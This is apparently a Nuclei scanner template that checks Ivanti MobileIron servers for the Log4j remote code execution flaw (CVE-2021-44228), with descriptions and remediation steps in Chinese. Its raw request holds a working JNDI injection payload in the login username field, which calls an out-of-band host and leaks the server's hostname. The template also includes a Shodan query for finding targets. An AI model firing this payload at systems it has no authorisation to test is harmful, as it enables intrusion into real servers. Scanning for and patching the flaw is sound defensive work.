id: mobileiron-log4j-rce

info:
  name: Ivanti MobileIron (Log4j) - 远程代码执行漏洞
  author: meme-lord
  severity: critical
  description: Ivanti MobileIron (Log4j) - 远程代码执行 受 Apache Log4j 相关缺陷影响，攻击者可在满足利用条件时触发远程代码执行漏洞。该模板通过实际请求与特征匹配验证目标是否仍暴露该漏洞面。
  remediation: |
    - 按厂商公告升级到已修复版本；原始说明中提到的版本信息为：version 2.16.0。
    - 尽快升级受影响组件并移除危险功能、调试接口或可被外部调用的执行链路。
    - 结合主机侧日志、计划任务和 Web 根目录文件进行排查，确认是否已被植入后门或执行恶意命令。
  reference:
    - https://github.com/advisories/GHSA-jfh8-c2jp-5v3q
    - https://www.lunasec.io/docs/blog/log4j-zero-day/
    - https://www.zdnet.com/article/mobileiron-customers-urged-to-patch-systems-due-to-potential-log4j-exploitation/
    - https://logging.apache.org/log4j/2.x/security.html
    - https://nvd.nist.gov/vuln/detail/CVE-2021-44228
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10
    cve-id: CVE-2021-44228
    cwe-id: CWE-917
    cpe: cpe:2.3:a:ivanti:mobileiron:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 1
    shodan-query: http.html:"MobileIron"
    product: mobileiron
    vendor: ivanti
  tags: jndi,log4j,rce,cve,cve2021,ivanti,oast,mobileiron,kev,vuln
variables:
  rand1: '{{rand_int(111, 999)}}'
  rand2: '{{rand_int(111, 999)}}'

http:
  - raw:
      - |
        POST /mifs/j_spring_security_check HTTP/1.1
        Referer: {{RootURL}}/mifs/user/login.jsp
        Content-Type: application/x-www-form-urlencoded

        j_username=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}}&j_password=password&logincontext=employee

    matchers-condition: and
    matchers:
      - type: word
        part: location
        words:
          - '/mifs/user/login.jsp?error=1'

      - type: word
        part: interactsh_protocol # Confirms the DNS Interaction
        words:
          - "dns"

      - type: regex
        part: interactsh_request
        regex:
          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'

    extractors:
      - type: kval
        kval:
          - interactsh_ip

      - type: regex
        part: interactsh_request
        group: 2
        regex:
          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'

      - type: regex
        part: interactsh_request
        group: 1
        regex:
          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'
# digest: 4a0a00473045022100c3cf4ec187935b554857019a75e6f780357889424941d51cc37a1d4f286f389e02206f084db0cc75272bd0b36308cfb604e17d8b7d2a86d331a49df0f588b7a7512f:922c64590222798bb761d5b6d8e72950